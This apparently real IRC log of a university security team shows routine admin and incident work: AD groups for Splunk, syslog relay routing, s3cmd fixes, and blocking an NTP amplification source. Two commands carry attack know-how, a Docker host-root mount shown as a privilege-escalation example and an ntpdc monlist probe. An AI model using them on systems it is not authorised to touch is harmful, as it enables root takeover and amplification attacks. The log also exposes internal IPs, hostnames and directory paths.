2015-01-29 13:03:30	jschipp	wraquel: eyrich: what should the FQDN be for new git server?
2015-01-29 13:07:44	soehlert	whats the new git server for?
2015-01-29 13:16:46	jazoff	eyrich: should alex be in the ad server?
2015-01-29 13:17:03	jazoff	want to finally give him splunk access but he didnt show up in the UI
2015-01-29 13:17:52	jazoff	i may be filtering to security though
2015-01-29 13:18:07	jazoff	i can always add a local account if needed though
2015-01-29 13:25:27	soehlert	anyone know if you can install tomcat without cups? terry is saying its required but that seems weird to me
2015-01-29 13:27:02	jazoff	huh
2015-01-29 13:27:18	jazoff	i could maybe see that somehow being a recommendation for an obscure feature but not a requirement
2015-01-29 13:27:49	jschipp	soehlert: tfluery and jbasney are requesting one :/
2015-01-29 13:28:02	jazoff	https://twitter.com/soilandreyes/status/449547313888112640
2015-01-29 13:28:49	jazoff	https://bugzilla.redhat.com/show_bug.cgi?id=490139
2015-01-29 13:29:40	jazoff	either way.. cups doesn't need to be running
2015-01-29 13:30:06	soehlert	jschipp: thats what i figured. sigh. did we convince them to put it outside the CA network?
2015-01-29 13:31:27	soehlert	jazoff: good find thanks. ya i guess i'll just shut it off after installed then
2015-01-29 13:33:34	soehlert	the polos are requiring probably over 100 added packages :/
2015-01-29 13:39:14	eyrich	jazoff: i dotn know if alex should have a AD account? It is not been made clear ot me what his role is
2015-01-29 13:39:35	jazoff	got me
2015-01-29 13:39:39	soehlert	he should be able to log in to all our machines, but not have root. he also should have full visibility to logs
2015-01-29 13:39:52	soehlert	the logs thing is the main component really
2015-01-29 13:40:25	eyrich	Ok I will get him an AD account, he also needs a duo
2015-01-29 13:41:00	eyrich	jschipp: something easy to type and with security in the name?
2015-01-29 13:41:48	jschipp	git-ca-sec?
2015-01-29 13:42:43	jschipp	this goes on public ip space too right?
2015-01-29 13:43:27	soehlert	could probably drop the sec. we've done it before for machiens outside the group
2015-01-29 13:43:27	soehlert	in fact i kinda like not having it for that so i can quickly tell if the machine is ops use only or not
2015-01-29 13:43:29	jazoff	wraquel: can you get ssl cert for splunk-sec.internal.ncsa.edu ?
2015-01-29 13:44:53	jschipp	i'll be managing it so I think it fits
2015-01-29 13:45:36	eyrich	i would veto something with CA in it
2015-01-29 13:46:12	eyrich	prefer to keep it more generic
2015-01-29 13:47:42	soehlert	jschipp: i know you'll be managing, i like not having -sec on machines we manage for people outside the group
2015-01-29 13:48:06	soehlert	for example bw-outbox
2015-01-29 13:48:09	eyrich	securitygit.
2015-01-29 13:48:20	soehlert	git-csd?
2015-01-29 13:48:31	eyrich	soehlert: i like
2015-01-29 13:48:34	jschipp	^
2015-01-29 13:48:43	jschipp	sold
2015-01-29 13:55:23	wraquel	git-csd works.
2015-01-29 13:56:23	wraquel	jazoff: yes. Send a CSR to help+ca@ncsa.illinois.edu and it'll get taken care of.
2015-01-29 13:58:45	wraquel	soehlert: yeah, terry wanted to use ours but I said no. I talked with Jon about possibly setting up one for them and this is where we're at.
2015-01-29 14:02:31	jazoff	wraquel: sent
2015-01-29 14:03:13	wraquel	So... if you went to a CTF, which one of these gadgets would you think were decent prizes? https://hakshop.myshopify.com/
2015-01-29 14:04:24	eyrich	i like HACKRF ONE
2015-01-29 14:04:39	jazoff	just so happens to be the most expensive thing on the page :)
2015-01-29 14:04:40	wraquel	you would
2015-01-29 14:05:01	eyrich	i didnt check for that, I like software defined radios
2015-01-29 14:05:05	wraquel	Last year we gave away the wifi pineapple as the grand prize
2015-01-29 14:05:12	eyrich	thats a good prize
2015-01-29 14:05:27	wraquel	We gave rubber duckies to runner ups
2015-01-29 14:05:45	jazoff	i've been meaning to get one of those software defined radios
2015-01-29 14:05:46	wraquel	PwnPIs to others and Red Team Field Manuals to everyone
2015-01-29 14:05:51	jazoff	for kicks
2015-01-29 14:07:49	jschipp	HACKRF one for sure
2015-01-29 14:08:03	eyrich	:)
2015-01-29 14:08:38	jschipp	sniff that POCSAG
2015-01-29 14:09:39	eyrich	alex has AD account now, i did not make him member of security group as that gets him full ESX admin
2015-01-29 14:10:06	eyrich	is anyone doing LDAP group or OU membership look ups for oether security stuff?
2015-01-29 14:10:18	jazoff	ah, so base DN of OU=Security,DC=ad,DC=security,DC=ncsa,DC=illinois,DC=edu wont work
2015-01-29 14:10:40	eyrich	it can
2015-01-29 14:10:41	wraquel	jazoff: nope.
2015-01-29 14:10:42	wraquel	oh
2015-01-29 14:10:50	wraquel	hmmm.
2015-01-29 14:11:05	wraquel	I have a security group in NCSA's UOFI OU.
2015-01-29 14:11:10	eyrich	ESX is decided by membership in CN=Security,OU=Security,DC=ad,DC=security,DC=ncsa,DC=illinois,DC=edu
2015-01-29 14:11:22	wraquel	If you want to use campus AD, I can make appropriate groups.
2015-01-29 14:11:43	eyrich	we can do the same with our AD, just need to know how we need to do it
2015-01-29 14:12:11	wraquel	BUt that would be something like OU=CSD,OU=Security,OU=NCSA,OU=Urbana,DC=ad,DC=uillinois,DC=edu
2015-01-29 14:12:22	eyrich	in general OU i dont think works well since a user object can not be in more then one.
2015-01-29 14:12:31	eyrich	better do to CN memership checks
2015-01-29 14:12:48	eyrich	no we have out own AD just for Security 
2015-01-29 14:13:10	eyrich	do we want someone group for splunk access?
2015-01-29 14:13:21	jazoff	if you want..
2015-01-29 14:13:29	jazoff	one can also make more than one group to do more fine grained access control
2015-01-29 14:13:35	eyrich	right
2015-01-29 14:13:59	eyrich	well all the full time ops guys are in  CN=Security,OU=Security,DC=ad,DC=security,DC=ncsa,DC=illinois,DC=edu
2015-01-29 14:14:35	eyrich	i made CN=Splunk,OU=Security,DC=ad,DC=security,DC=ncsa,DC=illinois,DC=edu
2015-01-29 14:14:38	eyrich	Alex is in that
2015-01-29 14:15:05	wraquel	0118 999 881 999 119 725
2015-01-29 14:15:28	eyrich	2
2015-01-29 14:15:34	wraquel	o_O
2015-01-29 14:16:31	jazoff	eyrich: perfect
2015-01-29 14:16:35	jazoff	3
2015-01-29 14:16:59	soehlert	because i'm confused
2015-01-29 14:16:59	soehlert	4
2015-01-29 14:17:18	wraquel	https://www.youtube.com/watch?v=ab8GtuPdrUQ
2015-01-29 14:18:23	soehlert	ooooo right. i didnt get that without the context but i know what you're getting at now
2015-01-29 14:19:04	wraquel	Do we have a server I could steal until mid May and use for the SPC CTF?
2015-01-29 14:21:10	jschipp	don't you still have the ones I borrowe?
2015-01-29 14:23:32	eyrich	wraquel: 
2015-01-29 14:23:40	eyrich	what email did you say for Alex to email?
2015-01-29 14:23:49	wraquel	jazoff: I gave them back to you and you put them in 3003.
2015-01-29 14:23:51	wraquel	I think
2015-01-29 14:23:56	wraquel	I brought them back here anyway.
2015-01-29 14:24:03	wraquel	I don't mind grabbing one back if it's available.
2015-01-29 14:24:16	wraquel	eyrich: securitysupport@illinois.edu
2015-01-29 14:24:53	jschipp	eyrich: did you take those servers back I can't remember? They're not in here nor at my apartment
2015-01-29 14:25:01	eyrich	not me
2015-01-29 14:25:15	eyrich	at least i dont think so
2015-01-29 14:25:21	wraquel	jschipp: I think we put thin in 3003.
2015-01-29 14:25:28	jschipp	oh, that may be
2015-01-29 14:26:57	eyrich	going hom
2015-01-29 14:26:59	eyrich	home
2015-01-29 14:35:05	wraquel	Need a bigger key size, jazoff 
2015-01-29 14:35:09	wraquel	1024 or higher
2015-01-29 14:37:14	soehlert	terry's hatred for puppet is only beaten by his inability to understand how it works :(
2015-01-29 14:40:11	jazoff	oh, my bad
2015-01-29 14:58:00	wraquel	Still 512...
2015-01-29 14:58:10	wraquel	            RSA Public Key: (512 bit)
2015-01-29 14:58:35	wraquel	wait
2015-01-29 14:58:36	wraquel	crap
2015-01-29 14:59:05	wraquel	yes, 2048
2015-01-29 15:00:00	wraquel	k, should get an email momentarily
2015-01-29 15:01:30	jazoff	ok
2015-01-29 15:02:01	 *	jschipp on a walk
2015-01-29 15:02:11	 *	wraquel sitting on ass
2015-01-29 15:02:42	 *	soehlert about to leave for an appointment
2015-01-29 15:04:15	soehlert	my mind is not working well today. puppet just runs `yum install [pacakge] -y` when you install a package with it right?
2015-01-29 15:04:29	soehlert	jazoff: 
2015-01-29 15:06:19	jazoff	or something similar, yeah
2015-01-29 15:06:24	jazoff	likely some other flags it adds
2015-01-29 15:06:33	soehlert	basically im asking, it install deps right?
2015-01-29 15:17:49	jazoff	yeah
2015-01-29 15:40:22	jazoff	splunk cert installed
2015-01-29 15:46:45	jazoff	jschipp: just need to work out that syslog issue
2015-01-29 15:54:55	jazoff	soehlert: yum -d 0 -e 0 -y install foo
2015-01-29 18:00:48	soehlert	thanks jazoff i could not for the life of me find that, where'd you find it
2015-01-29 18:36:13	jazoff	well I looked at the code, but it had a lot of logic so I cheated..
2015-01-29 18:36:27	jazoff	I removed a package on bro-dev and had puppet install it and looked at what command it ran
2015-01-29 18:41:57	soehlert	ah see i tried that method, but couldnt find where it put the whole command. probably shoulda done a --debug run and poured through that
2015-01-30 08:40:56	eyrich	email from Wayne regarding docker on clusters, asks that we think about the security implications
2015-01-30 08:49:11	jazoff	someone that can run docker basically has root
2015-01-30 09:02:38	eyrich	can you point to documentation for that, or an explanation. Wayane needs to formulate a sensible answer to the customer
2015-01-30 09:03:58	jazoff	docker run -it --rm -v /:/hostroot
2015-01-30 09:04:02	wraquel	root of the container?
2015-01-30 09:04:13	jazoff	/hostroot in the container is / in the host
2015-01-30 09:05:59	jazoff	not aware of any documentation that talks about this
2015-01-30 09:09:32	wraquel	Looks interesting: https://github.com/phusion/passenger-docker
2015-01-30 09:25:48	jazoff	eyrich: did you see the questions about the syslog relays and the new splunk server?
2015-01-30 09:26:23	jazoff	the relay boxes can't reach 10.142.148.54 on 1514
2015-01-30 09:26:38	jazoff	i think cyclone worked because that was on 141.142
2015-01-30 09:29:21	eyrich	yes relay boxes are on a different net they dont know how to get to 10.142.148.54
2015-01-30 09:29:27	eyrich	I will investigate
2015-01-30 09:40:28	jazoff	eyrich: how much does a decent box that can run pfsense cost?
2015-01-30 09:40:39	jazoff	really want to get one running at home so I can learn how they work
2015-01-30 09:43:22	eyrich	this is what I have at my wifes house
2015-01-30 09:43:23	eyrich	http://store.netgate.com/APU4.aspx
2015-01-30 09:44:00	jazoff	ah, that is pricy
2015-01-30 09:44:17	jazoff	edgerouter lite is only 99
2015-01-30 09:44:48	eyrich	if you want ubiqiti have at it
2015-01-30 09:45:08	jazoff	wonder if someone has managed to get pfsense to run on one
2015-01-30 09:45:13	eyrich	dont know
2015-01-30 09:51:19	wraquel	jazoff: I have the apu4 at home.
2015-01-30 09:51:33	wraquel	You can also just reuse an old computer.
2015-01-30 09:51:58	jazoff	I threw out all my old computers when I moved
2015-01-30 09:53:48	wraquel	jazoff: I'm a hoarder.
2015-01-30 09:54:28	wraquel	But, then my old computer died after a lighting storm so I decided to just get the APU4
2015-01-30 09:57:05	jazoff	yeah.. I threw out 2 suns, an sgi, 2 dells and a compaq
2015-01-30 10:01:11	jazoff	though I should possibly wait anyway... may end up with google fiber in 6 months
2015-01-30 10:55:47	eyrich	okay - so we need to have the relay boxes forward traffic to splunk?
2015-01-30 10:57:06	eyrich	?
2015-01-30 10:57:31	jazoff	yeah.. jschipp has it setup just disabled since it was buffering
2015-01-30 10:58:01	jazoff	10.142.158.70 -> 10.142.148.54:1514
2015-01-30 10:58:16	eyrich	well thats going to be fun
2015-01-30 10:58:27	jazoff	:(
2015-01-30 11:00:18	eyrich	oh , not so bad I already have the routes in place
2015-01-30 11:00:38	eyrich	just need to figure out the rules and if nat needed or not
2015-01-30 11:01:23	jazoff	hmm
2015-01-30 11:01:44	jazoff	splunk sec will try to reach the relay like so
2015-01-30 11:01:45	jazoff	10.142.158.70 via 10.142.148.1
2015-01-30 11:02:21	eyrich	no
2015-01-30 11:02:39	eyrich	10.142.158.70 to 141.142.148.126
2015-01-30 11:02:45	eyrich	to/via
2015-01-30 11:03:15	jazoff	ah, well nat is probably easier then
2015-01-30 11:03:29	eyrich	maybe, working on it
2015-01-30 11:03:30	jazoff	splunk-sec doesnt need to connect to the relays
2015-01-30 11:03:34	jazoff	if that helps
2015-01-30 11:07:00	eyrich	2 relay boxes?
2015-01-30 11:07:27	eyrich	70 and 71
2015-01-30 11:07:47	jazoff	yeah
2015-01-30 11:08:57	eyrich	tcp or udp?
2015-01-30 11:09:12	jazoff	tcp
2015-01-30 11:10:56	eyrich	can some oen try it
2015-01-30 11:13:34	eyrich	try 10.142.158.70 to  10.142.148.54:1514
2015-01-30 11:14:53	eyrich	going for a walk
2015-01-30 11:16:09	jazoff	no luck
2015-01-30 11:16:18	jazoff	don't see anything on splunk-sec
2015-01-30 11:52:32	eyrich	doesn jon need to enable it?
2015-01-30 11:53:12	eyrich	i think something weird with CIF server mail - it opened a ticket
2015-01-30 11:53:13	eyrich	o:root@cif-router-sec.ncsa.illinois.eduFrom:CIF User <cif@cif-router-sec.ncsa.illinois.edu>
2015-01-30 11:54:43	jazoff	eyrich: i tried with telnet.. didnt see the syn
2015-01-30 11:56:58	eyrich	try again, look for traffic from 141.142.148.94
2015-01-30 11:59:41	jazoff	nothing
2015-01-30 11:59:45	eyrich	there is a 1:1 nat rule for the relay boxes
2015-01-30 12:00:06	eyrich	hmm nothing from any IP?
2015-01-30 12:00:18	jazoff	correct. 
2015-01-30 12:00:58	eyrich	ok have to look into it later, heading to lunch with burag
2015-01-30 12:01:39	jazoff	ok
2015-01-30 12:05:45	jazoff	wow.. the test bhr system at cites...
2015-01-30 12:05:50	jazoff	bhr=# select count(1) from bhr_block;
2015-01-30 12:05:53	jazoff	 909482
2015-01-30 12:06:43	jazoff	bhr=# select count(distinct(cidr)) from bhr_block;
2015-01-30 12:06:45	jazoff	580379
2015-01-30 12:08:26	wraquel	 daslot
2015-01-30 12:09:02	jazoff	ours likely has similar numbers, just wanted to see how many that system had
2015-01-30 12:09:19	jazoff	performance seems fine so I must have the indexes right
2015-01-30 13:07:52	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Ping timeout)
2015-01-30 13:18:43	wraquel	I think the NCSA usernet just borked.
2015-01-30 13:18:46	wraquel	That or I got BHRed
2015-01-30 13:19:41	jazoff	eyrich just timed out...
2015-01-30 13:20:12	jazoff	i haven't noticed anything from here, so that does point to an issue in the building
2015-01-30 13:20:58	wraquel	yeah... I had to disconnect my office port and connect via wireless.
2015-01-30 13:32:30	wraquel	traceroute getting further now.
2015-01-30 13:59:20	wraquel	apparently a building firewall borked.
2015-01-30 14:00:03	jazoff	we have a firewall?
2015-01-30 14:00:39	wraquel	yeah
2015-01-30 14:00:43	wraquel	apparently
2015-01-30 14:00:52	wraquel	They're either Ciscos or new Junipers
2015-01-30 15:07:51	jazoff	ugh
2015-01-30 15:07:54	jazoff	Message: UDP DoS between 148.251.123.18:443/udp and 141.142.160.60:123/udp - orig_bytes=40512 resp_bytes=1242368
2015-01-30 15:08:04	soehlert	eek
2015-01-30 15:09:26	jazoff	ninfo dns 141.142.160.60
2015-01-30 15:09:27	ncsabot	Name: gpfsftp1.ncsa.illinois.edu Alias List: [] Address list: ['141.142.160.60']
2015-01-30 15:13:07	soehlert	wraquel: you around?
2015-01-30 15:14:29	jazoff	seems to have stopped...
2015-01-30 15:14:43	jazoff	i'll BHR the source adress for now even though they are the vivtim
2015-01-30 15:15:19	wraquel	k
2015-01-30 15:16:23	jazoff	no info in netdot
2015-01-30 15:18:40	wraquel	Dear  Lync... Please take longer to log in. Thanks!
2015-01-30 15:22:47	jazoff	ntpdc -n -c monlist 141.142.160.60
2015-01-30 15:22:52	jazoff	works from here, so definitely open
2015-01-30 15:40:54	-->	sam (soehlert@hidden-E95C13A8.ncsa.illinois.edu) has joined #security
2015-01-30 15:41:48	wraquel	So, keep an eye on alerts. The firewall hardware failed so they're bypassing it until it's fixed.
2015-01-30 15:42:09	wraquel	oh...
2015-01-30 15:42:30	wraquel	I wonder if 141.142.160.60 was in one of those firewall zones.
2015-01-30 15:42:49	sam	jazoff: does s3cmd log to anywhere?
2015-01-30 15:43:34	jazoff	not by default as far as i know
2015-01-30 15:43:45	jazoff	it likely has options for it though
2015-01-30 15:43:50	sam	ugh he cant make it work and keeps pushing me to prove its not our fault
2015-01-30 15:44:04	jazoff	what does it output?
2015-01-30 15:44:19	jazoff	s3 is literally just https to port 443
2015-01-30 15:44:29	jazoff	PUTS and GETS and that sort of thing
2015-01-30 15:44:29	sam	a shit ton of errors.[Errno 104] Connection reset by peer
2015-01-30 15:44:32	sam	is the main thing
2015-01-30 15:44:46	sam	https://jira.ncsa.illinois.edu/browse/BWCC-675
2015-01-30 15:47:57	jazoff	what version of s3cmd is it?
2015-01-30 15:48:12	sam	1.0.1
2015-01-30 15:48:28	sam	damnit, http://www.markhneedham.com/blog/2013/07/30/s3cmd-put-fails-with-connection-reset-by-peer-for-large-files/ suggests using 1.1.0
2015-01-30 15:49:11	jazoff	yeah, with 'Connection reset by peer', amazon is the peer
2015-01-30 15:49:20	sam	right
2015-01-30 15:50:20	sam	gonna see if i can update to 1.1.0
2015-01-30 15:51:09	sam	except apparently my choices are 1.0.1 or 1.5.0 beta
2015-01-30 15:51:23	jazoff	go with the beta, cant be any worse
2015-01-30 15:51:33	sam	fair point
2015-01-30 15:51:39	sam	and since thats all this box does..
2015-01-30 15:55:56	sam	good god, he was just going to try to install stuff himself :/ 
2015-01-30 15:56:10	jazoff	well it's just python :)
2015-01-30 15:56:29	sam	i mean i get that, but still this is supposed to be one of those dont touch it unless youre really sure hosts
2015-01-30 15:57:26	jazoff	i'm 90% sure that upgrading will fix the issues
2015-01-30 15:57:33	sam	i upgraded so he's going to try again
2015-01-30 15:57:56	jazoff	apparently 1.5 came out 2 weeks ago
2015-01-30 15:58:36	sam	well at least its had a few weeks to work out some bugs..
2015-01-30 15:59:25	jazoff	well i mean, 1.5 official
2015-01-30 15:59:45	jazoff	what was teh exact version?
2015-01-30 15:59:55	jazoff	apparently 1.5.0-beta1 came out in december 2013!
2015-01-30 16:00:05	sam	jeeze slow development
2015-01-30 16:00:23	sam	[root@bw-outbox ~]# s3cmd --version
2015-01-30 16:00:23	sam	s3cmd version 1.5.0
2015-01-30 16:00:29	sam	i'm kinda confused
2015-01-30 16:00:41	sam	i had to do this to get anything past what we had: sudo yum --enablerepo epel-testing install s3cmd
2015-01-30 16:01:40	jazoff	yeah, they must have pushed the release version to the testing repo
2015-01-30 16:01:52	jazoff	it's still testing if you had been using 1.0.1 successfuly 
2015-01-30 16:01:59	jazoff	but in your case it should be stabler
2015-01-30 16:02:18	sam	what's still testing?
2015-01-30 16:03:15	jazoff	I mean, it is in the epel-testing repo
2015-01-30 16:03:50	sam	ah ok
2015-01-30 16:06:15	wraquel	jazoff: can you lift the ichass bhr
2015-01-30 16:06:20	jazoff	yes
2015-01-30 16:06:25	wraquel	141.142.193.38 I think
2015-01-30 16:06:34	jazoff	ninfo dns ichass.ncsa
2015-01-30 16:06:35	ncsabot	Empty Result
2015-01-30 16:06:38	jazoff	ninfo dns ichass.ncsa.illinois.edu
2015-01-30 16:06:39	ncsabot	Name: ichass.illinois.edu Alias List: [] Address list: ['141.142.193.38']
2015-01-30 16:06:49	sam	ninfo hpss01.ncsa
2015-01-30 16:06:56	sam	ninfo dns hpss01.ncsa
2015-01-30 16:06:57	ncsabot	Empty Result
2015-01-30 16:07:13	sam	ninfo dns hpss01.internal
2015-01-30 16:07:14	ncsabot	Empty Result
2015-01-30 16:07:16	jazoff	i guess it doesnt use the search domain
2015-01-30 16:07:27	sam	nah i think they never registered hpss01 
2015-01-30 16:07:34	sam	and they wonder why squid wont allow it
2015-01-30 16:08:22	jazoff	that dns plugin needs work anyway, it's pretty barebones
2015-01-30 16:08:54	sam	[root@squid-sec squid]# host hpss01.ncsa.illinois.edu
2015-01-30 16:08:55	sam	Host hpss01.ncsa.illinois.edu not found: 3(NXDOMAIN)
2015-01-30 16:08:55	sam	[root@squid-sec squid]# host hpss01
2015-01-30 16:08:55	sam	Host hpss01 not found: 3(NXDOMAIN)
2015-01-30 16:08:55	sam	[root@squid-sec squid]# host hpss01.internal.ncsa.edu
2015-01-30 16:08:55	sam	Host hpss01.internal.ncsa.edu not found: 3(NXDOMAIN)
2015-01-30 16:09:00	jazoff	ah
2015-01-30 16:09:01	sam	ya that seems to be an issue
2015-01-30 16:09:32	jazoff	oh, i think names arent even supposed to work in that plugin
2015-01-30 16:09:41	jazoff	im only calling gethostbyaddr
2015-01-30 16:09:54	jazoff	so, surprised looking up a name works at all
2015-01-30 16:10:03	sam	interesting
2015-01-30 16:10:41	jazoff	must be a glibc thing, doesnt work at all on OS X
2015-01-30 16:11:11	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2015-01-30 16:16:50	sam	jazoff: random docker question for you
2015-01-30 16:18:10	jazoff	oook
2015-01-30 16:18:45	sam	i finally had some time to play last weekend. and i got that subsonic music streamer container working and forwarding ports. is there a way to save state? its configured via webui so it would suck to have to reconfigure any time the container needs to be turned off
2015-01-30 16:19:09	jazoff	well the state is saved by default unless you started it with --rm
2015-01-30 16:19:16	jazoff	but you likely are supposed to use a volume
2015-01-30 16:19:27	sam	ahh ok i'll look into that
2015-01-30 16:19:28	sam	thanks
2015-01-30 16:19:47	jazoff	without a volume you can start and stop it, but not upgrade
2015-01-30 16:20:06	jazoff	with a volume you can just stop the current one and start a new one with the same volume
2015-01-30 16:20:45	sam	ah ok so as long as i don't rm them they should be around even if i have to reboot the underlying server?
2015-01-30 16:20:53	jazoff	yeah
2015-01-30 16:20:58	jazoff	but you want volumes :)
2015-01-30 16:21:10	sam	because i think i am using a volume for the music to be available but i dont think the subsonic stuff is on a volume
2015-01-30 16:21:19	jazoff	yeah
2015-01-30 16:22:02	sam	cool thanks. i'll quit stealing your attention for today then :)
2015-01-30 16:26:54	sam	https://twitter.com/rapid7/status/561233927059148800
2015-01-30 16:27:34	jazoff	wow
2015-01-30 16:27:40	jazoff	we had a demo of that at UA a while ago
2015-01-30 16:27:48	jazoff	not too bad, seemed like an OK product..
2015-01-30 16:27:56	sam	ya ive heard good things from people who have used it
2015-01-30 16:27:59	jazoff	but it was crazy expensive and their sales people were so annoying
2015-01-30 16:28:06	sam	this is also what ive heard
2015-01-30 16:28:08	jazoff	though I think they have since fired all their sales people
2015-01-30 16:28:21	jazoff	or at least, stopped being so annoying
2015-01-30 16:29:11	jazoff	doesnt look like it is free to actually use for scanning though
2015-01-30 16:29:15	jazoff	"for teaching" etc
2015-01-30 16:29:49	sam	ah damn. because of my continuing network issues i can only get to ncsa hosts, twitter and facebook. no other sites :(
2015-01-30 16:30:02	jazoff	odd
2015-01-30 16:30:29	sam	a few months now. starting at ~3 pm every day. jschipp had issues before a couple times like this too.
2015-01-30 16:30:46	jazoff	what does something like telnet www.google.com 80 do?
2015-01-30 16:30:54	sam	oh right i can get to google too
2015-01-30 16:31:02	sam	and enter search terms and get response but cant go to any of the sites
2015-01-30 16:31:19	sam	and autoupdating sites im already on continue to wokr
2015-01-30 16:31:25	jazoff	oh well what does telnet www.oneofthesites.com 80 do?
2015-01-30 16:32:08	sam	telnet works fine to docker.com for instance even thoguh i can't load it right now
2015-01-30 16:32:37	sam	and this happens in multiple browsers
2015-01-30 16:32:41	jazoff	what about wget -O- www.docker.com
2015-01-30 16:32:47	sam	and im client as well
2015-01-30 16:33:12	sam	~/projects soehlert$ wget -O- www.docker.com
2015-01-30 16:33:12	sam	--2015-01-30 16:32:58--  http://www.docker.com/
2015-01-30 16:33:12	sam	Resolving www.docker.com... 162.242.195.82
2015-01-30 16:33:12	sam	Connecting to www.docker.com|162.242.195.82|:80... connected.
2015-01-30 16:33:12	sam	HTTP request sent, awaiting response... 302 Moved Temporarily
2015-01-30 16:33:14	sam	Location: https://www.docker.com/ [following]
2015-01-30 16:33:17	sam	--2015-01-30 16:33:02--  https://www.docker.com/
2015-01-30 16:33:19	sam	Connecting to www.docker.com|162.242.195.82|:443... connected.
2015-01-30 16:33:33	sam	and then like 10 seconds later i get the html
2015-01-30 16:33:44	jazoff	interesting
2015-01-30 16:33:49	jazoff	is it only ssl that does that?
2015-01-30 16:34:19	jazoff	try wget -O- www.reddit.com
2015-01-30 16:35:19	sam	~ soehlert$ wget -O- www.reddit.com
2015-01-30 16:35:20	sam	--2015-01-30 16:34:58--  http://www.reddit.com/
2015-01-30 16:35:20	sam	Resolving www.reddit.com... 198.41.208.138, 198.41.209.140, 198.41.209.137, ...
2015-01-30 16:35:22	sam	Connecting to www.reddit.com|198.41.208.138|:80... connected.
2015-01-30 16:35:25	sam	HTTP request sent, awaiting response... 200 OK
2015-01-30 16:35:27	sam	Length: unspecified [text/html]
2015-01-30 16:35:30	sam	Saving to: `STDOUT'
2015-01-30 16:35:32	sam	with the html coming back immediately
2015-01-30 16:35:40	jazoff	try wget -O- https://www.reddit.com
2015-01-30 16:36:20	sam	~ soehlert$ wget -O- https://www.reddit.com
2015-01-30 16:36:21	sam	--2015-01-30 16:35:49--  https://www.reddit.com/
2015-01-30 16:36:21	sam	Resolving www.reddit.com... 198.41.208.138, 198.41.209.140, 198.41.209.137, ...
2015-01-30 16:36:22	sam	Connecting to www.reddit.com|198.41.208.138|:443... connected.
2015-01-30 16:36:25	sam	Unable to establish SSL connection.
2015-01-30 16:38:40	jazoff	interesting
2015-01-30 16:39:27	sam	so from cli it seems like ssl might be an issue, but in browser, http vs https doesnt seem to make a difference
2015-01-30 17:03:36	sam	oh and btw, good call on the new s3cmd. works a charm
2015-01-30 17:04:28	sam	probably still behind here a bit but http://arstechnica.com/security/2015/01/critical-ghost-bug-could-haunt-wordpress-and-php-apps-too/
2015-01-30 17:08:55	sam	anyone opposed to me updating the security servers this weekend? ive updated the bastions and whatnot, but would like to do the ones behind the bastions this weekend
2015-01-30 17:58:14	-->	eyrich1 (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2015-01-30 17:59:22	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Ping timeout)
2015-01-30 18:37:47	eyrich1	im working on the LB firewalls
2015-01-30 18:52:19	eyrich1	crap I cant log onto thruk to ack the alarm
2015-01-30 19:10:26	eyrich1	the traffic to splunk from the relays will come from 141.142.148.94 and 95
2015-01-30 19:11:06	eyrich1	can someone update the iptables rules, 10.142.158.0/24 is not needed
2015-01-30 19:15:27	eyrich1	ok so fw rules on splunk already let traffic from 141 in
2015-01-30 19:15:41	eyrich1	141.142.148.0/25 so thats not it
2015-01-30 19:17:40	eyrich1	sec-splunk cant ping 141.142.148.1 but can ping 141.142.2.2.
2015-01-30 19:21:48	eyrich1	never mind i know why, its a no nat thing, we dont control routes on .1 router so cant point back
2015-01-30 20:37:28	eyrich1	ok so: doing packer capture on the 141.142.148.0/25 interface of the loadbalance pfsense box I see that when pinging 10.142.148.54/54 the destination mac is the 141.142.148.1 mac - it should be sending to 141.142.148.126's mac
2015-01-30 20:37:51	eyrich1	not sure if i am missing something, some weird order precedent or a pfbug
2015-01-30 21:19:39	eyrich1	eff it for tonight, i give up
2015-01-31 09:10:37	jazoff	does the load balance pfsense box have a route for 10.142.148 that points to 141.142.148.126?
2015-01-31 09:14:35	jazoff	sam: good to see the s3cmd update fixed the problem
2015-01-31 09:15:37	jazoff	i think the problem was the old version didn't support following redirects or something, so it would just keep sending data to the wrong endpoint until amazon said go away (connection reset by peer)
2015-02-01 21:35:12	eyrich1	jazoff: - yes there are routes to all the sec private IP space via .126
2015-02-02 09:08:59	jazoff	gah, got a lot more alerts for ntp on gpfsftp1.ncsa.illinois.edu
2015-02-02 09:09:20	wraquel	who manages them?
2015-02-02 09:09:23	wraquel	BW?
2015-02-02 09:09:34	jazoff	well it's on the 160 subnet
2015-02-02 09:10:09	wraquel	wait, I though you BHRed it
2015-02-02 09:10:26	jazoff	clearly should have, doing it now
2015-02-02 09:10:43	wraquel	Does netdot have a contact?
2015-02-02 09:11:27	wraquel	Looks like ADS is the contact.
2015-02-02 09:11:34	wraquel	Send a note to Brett Bode
2015-02-02 09:11:39	jazoff	blocked
2015-02-02 09:12:00	jazoff	netdot doesnt have a contact
2015-02-02 09:12:01	wraquel	other than port 123, is it in heavy use for ftp?
2015-02-02 09:12:49	jazoff	doesnt appear to be
2015-02-02 09:13:00	wraquel	good.
2015-02-02 09:13:10	wraquel	Hate to block a heavily used gpfs node....
2015-02-02 09:13:21	wraquel	Hmmm. I wonder if that's Wayne's schtick
2015-02-02 09:16:56	jazoff	looks like ssh was in use
2015-02-02 09:16:58	jazoff	dont see any ftp
2015-02-02 09:17:34	wraquel	Guessing it may have been sftp perhaps?
2015-02-02 09:17:48	jazoff	yeah
2015-02-02 09:17:55	jazoff	so.. brett? wayne?
2015-02-02 09:17:58	jazoff	who should I email?
2015-02-02 09:18:00	wraquel	brett
2015-02-02 09:18:09	wraquel	GPFS is an ADS thing. He'll forward it on.
2015-02-02 09:21:28	jazoff	done
2015-02-02 09:23:57	jazoff	Lots of interesting things happening in the tiny computer space
2015-02-02 09:24:06	wraquel	160?
2015-02-02 09:24:14	jazoff	raspberry pi 2 just announced
2015-02-02 09:24:15	jazoff	160?
2015-02-02 09:24:17	wraquel	oh
2015-02-02 09:24:30	wraquel	NUCs
2015-02-02 09:24:42	jazoff	yeah, still debating getting a NUC
2015-02-02 09:24:43	wraquel	I was thinking the 160 net
2015-02-02 09:24:53	wraquel	Yeah, the quad core Pi...
2015-02-02 09:25:03	jazoff	banana PI has 1G of ram too, but real gigE and SATA
2015-02-02 09:25:23	jazoff	http://www.htpcguides.com/raspberry-vs-banana-pi-benchmarks-sata-gigabit-matter/
2015-02-02 09:25:27	wraquel	Could be a hand held plex server
2015-02-02 09:25:44	jazoff	yeah, I use one of my raspberry pis to run minidnla for my tv
